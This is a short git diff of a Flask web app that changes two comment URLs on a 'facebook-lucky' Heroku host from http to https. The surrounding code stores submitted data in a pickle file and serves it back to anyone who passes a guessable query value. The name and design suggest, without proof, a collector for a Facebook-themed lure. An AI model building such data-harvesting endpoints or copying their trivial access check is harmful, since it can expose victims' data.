@@ -40,7 +40,7 @@ def store_info():
         PickleDumpLoad().save_config(data_fix, 'database.pickle')
     return jsonify({"status":"ok"}), 200
 
-# ACCESS THE PAGE: http://facebook-lucky.herokuapp.com/info?source=source
+# ACCESS THE PAGE: https://facebook-lucky.herokuapp.com/info?source=source
 @app.route('/info', methods=['GET'])
 def get_data():
     source = request.args.get('source')
@@ -50,7 +50,7 @@ def get_data():
     else:
         return jsonify({"status":"no info"}), 401
 
-# ACCESS THE PAGE: http://facebook-lucky.herokuapp.com/clear?source=clear    
+# ACCESS THE PAGE: https://facebook-lucky.herokuapp.com/clear?source=clear    
 @app.route('/clear', methods=['GET'])
 def clear_database(): 
     source = request.args.get('clear')
